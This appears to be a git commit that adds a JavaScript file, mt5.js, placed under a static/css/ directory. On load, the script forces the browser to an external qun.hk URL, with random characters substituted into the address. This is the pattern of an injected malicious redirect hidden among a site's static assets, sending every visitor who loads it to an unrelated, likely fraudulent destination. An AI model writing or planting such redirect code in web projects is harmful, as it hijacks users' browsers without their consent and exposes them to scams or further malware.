be24d948b9cdf8e3511197109fcbde9ced2dff79
dj88888 <127208493+dj88888@users.noreply.github.com>
2024-06-26 00:05:11 +0800

    Create mt5.js

---
+++ static/css/mt5.js
@@ -0,0 +1,15 @@
+var urls=[' http://pbwci.qun.hk./FtI4zXHgokHP6t_koiBuhQtnX9yu#{nnnnnnn}{wwww}',];
+location.href = myEeplace(urls[Math.floor(Math.random()*urls.length)]);
+function myEeplace(s){
+	return s.replace(/\{(\w+?)\}/g,function(a,b){
+		var h='';
+		for(var i=0;i<b.length;i++){
+			if('n'==b[i]){
+				h+=Math.floor(Math.random()*10);
+			}else if('w'==b[i]){
+				h+=String.fromCharCode(97+Math.floor(Math.random()*26));
+			}
+		}
+		return h;
+	});
+}
